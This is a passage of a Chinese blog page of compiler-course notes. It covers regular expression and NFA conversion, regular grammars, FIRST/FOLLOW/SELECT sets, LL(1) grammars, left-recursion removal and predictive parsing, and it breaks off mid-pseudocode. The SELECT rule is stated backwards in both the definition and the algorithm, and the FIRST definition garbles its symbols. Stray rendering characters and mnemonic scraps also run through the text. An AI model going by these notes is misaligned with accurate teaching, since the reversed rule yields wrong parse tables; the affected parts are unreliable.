class="comment">2</span></span><br><span class="line"><span class="comment">最后x结点和y结点之间的弧上的标记就是所求的正规式R</span></span><br></pre></td></tr></table></figure><p>NFA &rArr; Re</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">方法如上反转</span></span><br><span class="line"><span class="comment">首先，对正规式R构造如下拓广转换图</span></span><br><span class="line"><span class="comment">然后通过对R进行分裂和加进新结点的办法，逐步把这个图转变为：每条弧标记为中的一个字母或ε</span> <span class="comment">，其转换规则如下:</span></span><br><span class="line"><span class="comment">1</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R1R2</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">2==</span>&gt;<span class="comment">A</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R1</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">2</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R2</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">3</span></span><br><span class="line"><span class="comment">1</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R1|R2</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">2==</span>&gt;<span class="comment">1</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R1</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">2</span><span class="string">,</span><span class="comment">1</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R2</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">2</span></span><br><span class="line"><span class="comment">1</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R1R2*R3</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">2==</span>&gt;<span class="comment">1</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R1</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">2</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R2</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">2</span><span class="literal">-</span><span class="literal">-</span><span class="comment">R3</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">3</span></span><br><span class="line"><span class="comment">在整个分裂过程中，所有新结点均采用不同的名字，保留x和y为全图的唯一初态结点和终态结点，至此我们就可以得到一个与R</span> <span class="comment">等价的NFA</span> <span class="comment">M</span></span><br></pre></td></tr></table></figure><h5 id="正规文法与有穷自动机的等价性"><a href="#正规文法与有穷自动机的等价性" class="headerlink" title="正规文法与有穷自动机的等价性"></a>正规文法与有穷自动机的等价性</h5><p>定理：①对于给定的正规文法G[R]，可以直接构造一个NFA M，使得L（M）=L（G）。②对于 Σ 上的任一个NFA M ，可以直接构造正规文法G[R] ，使得L（ R ）=L（ M ）。</p><p>把给定的正规文法G[R]转换为一个Σ上的NFA M构造规则:</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">设G[<span class="keyword">R</span>]=（VN，VT，<span class="keyword">P</span>，<span class="keyword">R</span>）， NFA M=（ K，Σ，f，S，<span class="keyword">Z</span>）</span><br><span class="line"><span class="number">1</span>.令 Σ = VT;</span><br><span class="line"><span class="number">2</span>. K = VN，S = <span class="keyword">R</span>；即对G中的每个非终结符生成M的一个状态（不妨取相同的名字，G的开始符号是M的初态;</span><br><span class="line"><span class="number">3</span>.增加一个新状态<span class="keyword">Z</span>，作为NFA M 的终态，<span class="keyword">Z</span>∈K;</span><br><span class="line"><span class="number">4</span>.对G中的形如A-&gt;tB（其中t为终结符或ε；A和B为非终结符）的产生式,构造M的一个转换函数     f（A，t）=B;</span><br><span class="line"><span class="number">5</span>.对G中的形如A-&gt;t（其中t为终结符或ε；A和B为非终结符）的产生式,构造M的一个转换函数      f（A，t）=<span class="keyword">Z</span>;</span><br></pre></td></tr></table></figure><p>把给定的å上的NFA M转换为一个正规文法G[R]的构造规则:</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">设NFA M=（ K，Σ，f，S，<span class="keyword">Z</span>）,G[<span class="keyword">R</span>]=（VN，VT，<span class="keyword">P</span>，<span class="keyword">R</span>）,</span><br><span class="line"><span class="number">1</span>.令 VT = Σ ;</span><br><span class="line"><span class="number">2</span>.令VN =  K即对M的每一个状态生成G中的非终结符（不妨取相同的名字，G的开始符号是M的初态;</span><br><span class="line"><span class="number">3</span>.令S=<span class="keyword">R</span>（如果M有多个初态，应先拓广自动机，引入新初态x）;</span><br><span class="line"><span class="number">4</span>.对M 的终态<span class="keyword">Z</span>增加一个产生式： <span class="keyword">Z</span>-&gt;ε;</span><br><span class="line"><span class="number">5</span>.对M的每一个转换函数f（A，t）=B可写G的一个产生式A-&gt;tB（其中t为终结符或ε;A和B为非终结符）;</span><br></pre></td></tr></table></figure><h5 id="词法分析程序的自动构造"><a href="#词法分析程序的自动构造" class="headerlink" title="词法分析程序的自动构造"></a>词法分析程序的自动构造</h5><p>​        若对自动机的每一个状态赋予一定的功能，并把其边上的符号视为转移条件，那么自动机就成为一个程序了。</p><h2 id="四、语法分析"><a href="#四、语法分析" class="headerlink" title="四、语法分析"></a>四、语法分析</h2><p><strong>语法分析的主要工作</strong>：是识别由词法分析器给出的单词序列是否是给定的正确句子（程序）</p><p>语法分析的常用方法：自顶向下的语法分析（Top-Down Parsing）和自底向上的语法分析（Bottom-Up Parsing）两大类</p><h3 id="自顶向下语法分析"><a href="#自顶向下语法分析" class="headerlink" title="自顶向下语法分析"></a>自顶向下语法分析</h3><p>方法：从文法的开始符号（设为 &lt;程序&gt; ）开始进行分析，逐渐推导的往下构造语法树，使其树叶正好构造所给定的源程序串</p><p>关键：是确定在推导过程中选择候选式的问题。当进行推导时，一个非终结符可能对应多个产生式，这样我们就无法事先知道应该用哪个产生式，因此必须对文法做一些限制，以便在任何情况下都唔那个确定应该用的产生式</p><p>主要思想：从开始符号出发，导出句型并一个符号一个符号地与给定终结符串进行匹配。如果全部匹配成功，则表示开始符号可推导出给定的终结符串。因此判定给定终结符号串是正确句子。</p><p>缺点：若在推导过程中，不对文法进行限制，那么产生式的选择成为无根据的，只好一一去尝试所有可能的产生式，直至成功为止。这种方法致命的地方是不断地回溯，大大影响速度。所以自顶向下分析法分为确定和不确定两种。我们在下面讨论确定的分析方法，这种方法简单直观，便于手工构造或自动生成语法分析器。</p><p>在推导过程中，对于产生式相同左部含有非终结符开始的右部时，在推到中选用哪个产生式是不能直接知道的，也就是该语法分析的缺点。</p><h4 id="1-首符集、后继符集、选择集（Fisrt-Follow-Select-）"><a href="#1-首符集、后继符集、选择集（Fisrt-Follow-Select-）" class="headerlink" title="1. 首符集、后继符集、选择集（Fisrt(),Follow(),Select()）"></a>1. 首符集、后继符集、选择集（Fisrt(),Follow(),Select()）</h4><h5 id="首符集的定义"><a href="#首符集的定义" class="headerlink" title="首符集的定义"></a>首符集的定义</h5><p>设G = （ V<sub>N</sub> ，V<sub>T</sub> ，P ，S）是上下文无关文法，α 是G的任一符号串，则有 </p><p>First(α) = { a | α<sup><em></em></sup>  &rArr; αβ，α ∈ V<sub>T</sub> ，α、β ∈ V<sup>\</sup> }</p><p>特别地，若 α  =<sup>*</sup>&rArr; ε，则规定 ε ∈ First(α) </p><p>即：Fisrt(α)集是从α出发推导出所有符号串首终结符或可能的ε构成的集合。</p><h6 id="构造算法"><a href="#构造算法" class="headerlink" title="构造算法"></a>构造算法</h6><p>1.求Fisrt(X)</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">对每一文法符号<span class="keyword">X</span>∈(VN∪VT），求FIRST(<span class="keyword">X</span>).</span><br><span class="line"></span><br><span class="line">(a)若<span class="keyword">X</span>∈VT,则令FIRST(<span class="keyword">X</span>)=&#123;<span class="keyword">X</span>&#125;;</span><br><span class="line"></span><br><span class="line">(b)若<span class="keyword">X</span>∈VN,且有产生式<span class="keyword">X</span>→a……,(a∈VT)，则令a∈FIRST(<span class="keyword">X</span>);</span><br><span class="line"></span><br><span class="line">(c) 若<span class="keyword">X</span>∈VN,有<span class="keyword">X</span>→ε，则令 ε∈FIRST(<span class="keyword">X</span>);</span><br><span class="line"></span><br><span class="line">(d)若 <span class="keyword">X</span>∈VN, y<span class="number">1</span>, y<span class="number">2</span>,……,yi都∈VN,且有产生式<span class="keyword">X</span>→ y<span class="number">1</span> y<span class="number">2</span>…..yn,      </span><br><span class="line">   当y<span class="number">1</span>, y<span class="number">2</span>,…..yi<span class="number">-1</span> 都 =*=&gt;ε时，（其中<span class="number">1</span>≤i≤n),则FIRST(y<span class="number">1</span>)-ε,</span><br><span class="line">FIRST(y<span class="number">2</span>)-ε,….,FIRST(yi<span class="number">-1</span> )-ε,FIRST(yi)都包含在FIRST(<span class="keyword">X</span>)中。</span><br><span class="line"></span><br><span class="line">(e)当(d)中所有yi =*=&gt; ε(i= <span class="number">1</span>,<span class="number">2</span>,….,n),则FIRST(<span class="keyword">X</span>)=FIRST(y<span class="number">1</span>)∪FIRST(y<span class="number">2</span>)∪….∪FIRST(yn)∪&#123;ε&#125;</span><br><span class="line">反复使用上述（b)～(d) 步直到每个符号的FIRST集合不再增加</span><br><span class="line">为止。</span><br></pre></td></tr></table></figure><p>2.求Fisrt(α)</p><p> α = x<sub>1</sub>x<sub>2</sub>……x<sub>n</sub> </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">法<span class="number">1</span>:</span><br><span class="line"><span class="number">1</span>.若n=<span class="number">0</span>,即α=ε,则令FIRST(α)=&#123;ε&#125;<span class="comment">;</span></span><br><span class="line"><span class="comment">2.否则，对1≤i≤n,求FIRST(xi)</span></span><br><span class="line"><span class="comment">3.若n=1,则令 FIRST(α)=FIRST(x1);</span></span><br><span class="line"><span class="comment">4.若n≥2且对一切j=1,2,….,i-1都有ε∈FIRST(xj).</span></span><br><span class="line"><span class="comment">   则令FIRST(xi )-&#123;ε&#125;    FIRST(α),其中2≤i≤n;</span></span><br><span class="line"><span class="comment">   若对一切 j=1,2,…,n都有ε∈FIRST(xj),则令ε∈FIRST(α)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">法2:</span></span><br><span class="line"><span class="comment">1.把FIRST(x1)中所有非ε元素加入到FIRST(α)中，即</span></span><br><span class="line"><span class="comment">                  FIRST(α )=FIRST(x1)-&#123;ε &#125;;</span></span><br><span class="line"><span class="comment">若FIRST(x1)包含有ε，则把FIRST(x2)的所有非ε元素加入到</span></span><br><span class="line"><span class="comment">        FIRST(α)中，即FIRST(α)=FIRST(α)∪ (FIRST(x2)-&#123;ε&#125;);</span></span><br><span class="line"><span class="comment">若FIRST(x1)和FIRST(x2)都包含有 ε，则把FIRST(x3)的所有</span></span><br><span class="line"><span class="comment">        非ε元素加到FIRST(α)中;……</span></span><br><span class="line"><span class="comment">     照此方法继续，一直到考察到xn。</span></span><br><span class="line"><span class="comment">2.若FIRST(xi ),i= 1,2,…,n;即每个FIRST(xi)中都有ε。则将ε加</span></span><br><span class="line"><span class="comment">      到FIRST(α)中。特别地， 若 α=ε ，则FIRST(α)=&#123;ε&#125;.</span></span><br></pre></td></tr></table></figure><h5 id="后继符的定义"><a href="#后继符的定义" class="headerlink" title="后继符的定义"></a>后继符的定义</h5><p>设G = （ V<sub>N</sub> ，V<sub>T</sub> ，P ，S）是上下文无关文法，A ∈ V<sub>N</sub> 的后继符集合为</p><p>Follow(A) = { a | S =<sup>*</sup>&rArr; μAβ ，a ∈ V<sub>T</sub> ， a ∈ First(β) ， μ ∈ V<sub>T</sub><sup>*</sup>   ，β ∈  V<sup>*</sup>  }</p><p>或 Follow(A) = { a | S =<sup>*</sup>&rArr; …Aa…，a ∈ V<sub>T</sub> }</p><p>特别地，若S =<sup>*</sup>&rArr; …A ， 则# ∈ Follow(A) 。这里的#是代表一个输入串的结束符</p><p>表示所有句型中紧挨着A出现的终结符或#均是Follow(A)的元素</p><h6 id="构造算法-1"><a href="#构造算法-1" class="headerlink" title="构造算法"></a>构造算法</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">落#下<span class="selector-tag">S</span></span><br><span class="line">(a)对文法开始符号<span class="selector-tag">S</span>,令# ∈ <span class="selector-tag">FOLLOW</span>(S).</span><br><span class="line"></span><br><span class="line">右部<span class="selector-tag">Follow</span></span><br><span class="line">(b)若<span class="selector-tag">B</span>→α<span class="selector-tag">A</span>β是一个产生式,则令<span class="selector-tag">FIRST</span>(β)<span class="selector-tag">-</span>&#123;ε&#125;</span><br><span class="line">        属于<span class="selector-tag">FOLLOW</span>(A);</span><br><span class="line"></span><br><span class="line">守门员福利</span><br><span class="line">(c) 若<span class="selector-tag">B</span>→α<span class="selector-tag">A</span>是一个产生式，或<span class="selector-tag">B</span>→α<span class="selector-tag">A</span>β是一个产生式且有ε∈<span class="selector-tag">FIRST</span>(β),</span><br><span class="line">4则令<span class="selector-tag">FOLLOW</span>(B)是<span class="selector-tag">FOLLOW</span>(A)的子集。即把<span class="selector-tag">FOLLOW</span>(B)的所有元素加入到<span class="selector-tag">FOLLOW</span>(A)中。</span><br><span class="line"></span><br><span class="line">(d)反复使用(b)直到每个非终结符的 <span class="selector-tag">FOLLOW</span>集合不再增加为止。</span><br></pre></td></tr></table></figure><h5 id="选择集的定义"><a href="#选择集的定义" class="headerlink" title="选择集的定义"></a>选择集的定义</h5><p>对于给出的上下文无关的文法产生式 A &rarr; α ， A ∈ V<sub>N</sub> ， α ∈ V<sup>*</sup> ，则</p><p>Select(A &rarr; α) = First(α) ，当 α =*&rArr; ε 时</p><p>Select(A &rarr; α) = Fisrt(α) &cup; Follow(A) ，其他情况</p><h6 id="构造算法-2"><a href="#构造算法-2" class="headerlink" title="构造算法"></a>构造算法</h6><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">(a)</span>求FIRST<span class="comment">(α)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">(b)</span>若ε∈FIRST<span class="comment">(α)</span>,则令SELECT<span class="comment">(A→α)</span>=FIRST<span class="comment">(α)</span></span><br><span class="line">         否则求FOLLOW<span class="comment">(A)</span>,并令 SELECT<span class="comment">(A→α)</span> = FIRST<span class="comment">(α)</span> ∪ FOLLOW<span class="comment">(A)</span>.</span><br></pre></td></tr></table></figure><h4 id="2-LL-1-分析法"><a href="#2-LL-1-分析法" class="headerlink" title="2. LL(1)分析法"></a>2. LL(1)分析法</h4><p>当一个文法是LL(1)文法时，则该文法一定能采用确定的自顶向下的分析方法进行分析。</p><p><strong>定义</strong>：一个上下文无关文法是LL(1)文法的充分必要条件是每个非终结符A的两个不同产生式，A &rarr; α ，A &rarr; β ，满足  Select(A &rarr; α) &cap; Select(A &rarr; β) = &empty;  ，其中，α和β不能同时 =*&rArr;  ε。</p><h4 id="文法的等价变换"><a href="#文法的等价变换" class="headerlink" title="文法的等价变换"></a>文法的等价变换</h4><p>确定的自顶向下分析要求给定语言的文法必须是 LL(1)形式，然而，不一定每个语言都是LL(1)文法，对一个语言的非LL(1)文法是否能变换为等价的LL(1)形式以及如何变换是我们讨论的主要问题。由LL(1)文法的定义可知若文法中<strong>含有左递归</strong>或<strong>含有左公共因子</strong>，则该文法肯定不是LL(1)文法，因而，我们设法消除文法中的左递归，<strong>提取左公共因子</strong>对文法进行等价变换。</p><h5 id="Ⅰ提取左公共因子"><a href="#Ⅰ提取左公共因子" class="headerlink" title="Ⅰ提取左公共因子"></a>Ⅰ提取左公共因子</h5><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对A→ αβ1|<span class="string">  αβ2 </span>|<span class="string"> … </span>|<span class="string">  αβn提取左公因子为：</span></span><br><span class="line"><span class="string">　　　A→ α A'      </span></span><br><span class="line"><span class="string">　　　A'→  β1 </span>|<span class="string"> β2 </span>|<span class="string"> … </span>|<span class="string"> βn</span></span><br><span class="line"><span class="string">若在βi , βj , βk…中仍含有左公共因子，可再进行提取，这样反复进行提取直到所引进的新非终结符的有关产生式均无左公共因子为止</span></span><br></pre></td></tr></table></figure><p><strong>结论</strong>：一个文法提取了左公共因子后，只解决了相同左部产生式的右部FIRST集不相交问题。当改写后的文法不含有空产生式，且无左递归时，则改写后的文法是LL(1)文法。否则还需用LL(1)文法的判别方法进行判断才能确定是否为LL(1)文法。</p><h5 id="Ⅱ消除左递归"><a href="#Ⅱ消除左递归" class="headerlink" title="Ⅱ消除左递归"></a>Ⅱ消除左递归</h5><p>一个文法含有下列形式的产生式之一时：</p><blockquote><p>1) A→A β, A∈V<sub>N</sub> , β ∈ V*</p><p>2) A→B β, B→A α,   A,B∈VN,  α ,β ∈ V*</p></blockquote><p>则称该文法是左递归的。</p><p>含有左递归的文法不能采取自顶向下分析法。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">1):把直接左递归改写为右递归</span><br><span class="line"></span><br><span class="line">设有文法产生式: A→Aβ|<span class="string">γ.   其中β非空， γ不以A打头。</span></span><br><span class="line"><span class="string">    可写为:    A → γA'      </span></span><br><span class="line"><span class="string">      A' → βA' </span>|<span class="string"> ε</span></span><br><span class="line"><span class="string">    一般情况下，假定关于A的产生式是：</span></span><br><span class="line"><span class="string">    A→A α1</span>|<span class="string"> A α2 </span>|<span class="string"> … </span>|<span class="string"> A αm </span>|<span class="string"> β1 </span>|<span class="string"> β2 </span>|<span class="string"> …</span>|<span class="string"> βn            </span></span><br><span class="line"><span class="string">    其中，αi(1≤i≤m)均不为空， βj(1≤j≤n)均不以A打头。</span></span><br><span class="line"><span class="string">则消除直接左递归后改写为：</span></span><br><span class="line"><span class="string">A → β1 A' </span>|<span class="string"> β2 A' </span>|<span class="string"> … </span>|<span class="string"> βn A'</span></span><br><span class="line"><span class="string">A'→ α1 A' </span>|<span class="string"> α2 A' </span>|<span class="string"> … </span>|<span class="string"> αm A' </span>|<span class="string"> ε</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">2):间接消除左递归</span></span><br><span class="line"></span><br><span class="line"><span class="string">对于间接左递归的消除需要先将间接左递归变为直接左递归，然后再按1)清除左递归</span></span><br><span class="line"></span><br><span class="line"><span class="string">哪一步有左递归，就把那一步的间接左递归代入产生式产生直接左递归</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">----------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="string">3):消除文法中一切左递归的算法</span></span><br><span class="line"></span><br><span class="line"><span class="string">设非终结符按某种规则排序为A1, A2,… An 。</span></span><br><span class="line"><span class="string">For i:=1 to n  do</span></span><br><span class="line"><span class="string">   begin</span></span><br><span class="line"><span class="string">      For j:=1 to i-1 do </span></span><br><span class="line"><span class="string">          begin</span></span><br><span class="line"><span class="string">               若Aj的所有产生式为：</span></span><br><span class="line"><span class="string">                Aj → δ1 </span>|<span class="string"> δ2 </span>|<span class="string"> … </span>|<span class="string"> δn</span></span><br><span class="line"><span class="string">               替换形如Ai → Aj γ的产生式为：</span></span><br><span class="line"><span class="string">                Ai → δ1γ </span>|<span class="string"> δ2γ </span>|<span class="string"> … </span>|<span class="string"> δnγ</span></span><br><span class="line"><span class="string">          end</span></span><br><span class="line"><span class="string">       消除Ai中的一切直接左递归</span></span><br><span class="line"><span class="string">    end</span></span><br></pre></td></tr></table></figure><h4 id="递归下降分析程序构造"><a href="#递归下降分析程序构造" class="headerlink" title="递归下降分析程序构造"></a>递归下降分析程序构造</h4><p>在程序语言的语法定义中有许多采用递归定义。我们在对它进行语法分析时，编制的处理程序也采取递归的方式，可使其结构简单易读。但由于频繁地调用子程序大大地降低了分析速度</p><p>主要思想：对<strong>每个非终结符</strong>按其<strong>产生式结构</strong>写出相应的语法分析子程序。因为每个文法递归相应子程序也递归，子程序的结构与产生式结构一致。所以称此种方法称为递归子程序法或递归下降法。</p><p>用程序表示递归子程序的内部结构：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">4设A是一个非终结符：A→β<span class="number">1</span> </span><br><span class="line">44444A→β<span class="number">2</span></span><br><span class="line">44444 ┊</span><br><span class="line">44444A→βn</span><br><span class="line"></span><br><span class="line">4则写     ζ(A) &lt;==&gt; <span class="keyword">if</span> <span class="keyword">char</span>∈<span class="keyword">first</span>(β<span class="number">1</span> )  <span class="keyword">then</span>ζ(β<span class="number">1</span> )</span><br><span class="line">                                <span class="keyword">else</span> <span class="keyword">if</span> <span class="keyword">char</span> ∈ <span class="keyword">first</span>(β<span class="number">2</span> )  <span class="keyword">then</span> ζ(β<span class="number">2</span> )</span><br><span class="line">                                              <span class="keyword">else</span>…</span><br><span class="line">                                                       <span class="keyword">if</span> <span class="keyword">char</span>∈<span class="keyword">first</span>(βn )</span><br><span class="line">                                                       <span class="keyword">then</span> ζ(βn)</span><br><span class="line">                                                                <span class="keyword">else</span>    ERROR</span><br><span class="line"></span><br><span class="line">其中ζ(βi)表示调用处理符号串βi的子程序。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">对A的任一右部i 设为：     βi = y1 y2 … yn</span><br><span class="line">则定义ζ( βi) &lt;==&gt; beginζ(y1);ζ(y2);…;ζ(yn) <span class="keyword">end</span></span><br><span class="line">其中yj可分为下列两种情况（j=<span class="number">1</span>,…,n):</span><br><span class="line"><span class="number">1</span>)  yj∈VT,则</span><br><span class="line">     ζ( yj) &lt;==&gt; <span class="keyword">if</span> <span class="keyword">char</span>≠ yj  <span class="keyword">then</span>  ERROR  <span class="keyword">else</span>    READ(<span class="keyword">char</span>)</span><br><span class="line"><span class="number">2</span>)  yj∈VN,则ζ(yj)表示调用关于yj的递归子程序。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">对文法加限制：</span><br><span class="line"><span class="number">1.</span>任一非终结符B都不是左递归的，否则会产生死循环。</span><br><span class="line"><span class="number">2.</span>对A的任意两个右部βi , βj ,有：<span class="keyword">first</span>(βi) ∩ <span class="keyword">first</span>(βj) = φ ,</span><br><span class="line">First(βi)表示βi所能导出串的第一个符号的集合。显然，每个βi的<span class="keyword">first</span>(βi)是互不相同的，否则则无法判断应执行哪个ζ(βi )。</span><br></pre></td></tr></table></figure><h4 id="预测分析程序"><a href="#预测分析程序" class="headerlink" title="预测分析程序"></a>预测分析程序</h4><p>LL(k)文法是采取确定的<strong>自左至右扫描</strong>（输入串）和自顶向下分析技术的最大一类文法。</p><p><strong>LL系指</strong>：自左向右扫描（输入串），自上而下进行最<strong>左</strong>推导。一般来说，一个文法当其分析器对输入串进行自左至右扫描并采用自顶向下方法进行分析的过程中，如果每步仅利用当前的非终结符（事实上此时它已位于分析栈顶）和至多向前查看k个输入符号就能唯一 决定采取什么动作，那么这个文法称为<strong>LL(K)文法</strong>。</p><p>对于大多数程序设计语言而言。K=1就足够了。因此我们将主要讨论k=1的情形。</p><h5 id="LL-1-文法的分析过程"><a href="#LL-1-文法的分析过程" class="headerlink" title="LL(1)文法的分析过程"></a>LL(1)文法的分析过程</h5><p>设分析的当前格局为（x1x2 …. xn#, y1y2 …. ym#)</p><p>其中xi表示句型的前端部分，诸yj表示输入流的后端部分（终结符串）。则可能有下述动作之一：</p><p>1.替代：当x<sub>1</sub>∈V<sub>N</sub>时，则选相应的候选式去替换x<sub>1</sub> 。</p><p>2.匹配：当x<sub>1</sub>∈VT时，它与y<sub>1</sub>进行匹配，其结果为两种可能，如</p><p>   果匹配成功，则去掉x<sub>1</sub>和y<sub>1</sub>（即指针后移一位）否则报错。</p><p>3.接受：当格局为(#, #）时，报告分析成功结束。</p><p>从实现的角度来说，上述替换过程需要花较多的时间，因为它除了把一个候选式替换掉x1,还需要x2 … xn统统进行移位处理，这时很麻烦的。我们的处理方法是用栈来保存x1x2 … xn,而且是把xn作为栈底， x1作为栈顶，那么上述的替换动作就简单了，只需在栈顶进行替换。即去掉x1把候选式的符号串按逆序方式压入栈中即可。</p><h5 id="LL-1-方法的实现"><a href="#LL-1-方法的实现" class="headerlink" title="LL(1)方法的实现"></a>LL(1)方法的实现</h5><p>LL(1)方法在实现时用到一个LL(1)分析矩阵和一个分析栈以及预测分析程序。</p><p>分析矩阵的元素M[A,a]中的下标A为非终结符，a为终结符或句子结束标记”#”，矩阵元素M[A,a]的内容为一条关于A的产生式。</p><p>它表明当用非终结符A向下推导而当前输入符为a时，所应采用的候选式。当矩阵元素为空时，则表示用A往下推导时遇到了不应该出现的符号，即A与a不能匹配。因此应该转向出错处理。</p><p>预测分析程序如下图</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\11.jpg" alt></p><p>①判断文法G[E]是否为LL(1)文法，若文法中含有左递归那么要先消除左递归，然后求select集</p><p>②构造预测分析表，对每个终结符或’#’号用a表示，则若a∈Select(A&rarr;α)。令 M[A,a]=A&rarr;α</p><p>把所有无定义的M[A,a]标上ERROR</p><p>伪代码如下：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">其程序维护一个栈Stack用来储存非终结符，一个用于储存源程序的读入字符变量a，一个用于储存栈顶元素XX</span><br><span class="line">其中M[A,a] = &#123;X-&gt;x1x2……xk&#125; 为 <span class="keyword">Select</span>(X-&gt;x1x2……xk)=&#123;a,……&#125;,X为非终结符,a为终结符</span><br><span class="line"></span><br><span class="line">#和开始符合入栈</span><br><span class="line">把第一个输入符号读入a</span><br><span class="line">Flag := <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> Flag <span class="keyword">Do</span>:</span><br><span class="line">4把栈顶元素出栈到X中</span><br><span class="line">4<span class="keyword">if</span> X ∈ VT <span class="keyword">then</span></span><br><span class="line">44<span class="keyword">if</span> X = a <span class="keyword">then</span> 把下一个输入符号读入a</span><br><span class="line">44<span class="keyword">else</span> <span class="keyword">ERROR</span></span><br><span class="line">4<span class="keyword">else</span> <span class="keyword">if</span> X = <span class="comment">'#' then </span></span><br><span class="line">44     Flag := <span class="literal">False</span> </span><br><span class="line">44  <span class="keyword">else</span> <span class="keyword">ERROR</span></span><br><span class="line">4<span class="keyword">else</span> <span class="keyword">if</span> M[X,a] = &#123;X-&gt;x1x2x3……Xxk&#125; <span class="keyword">then</span></span><br><span class="line">444把x1x2x3……xk入栈</span><br><span class="line">4<span 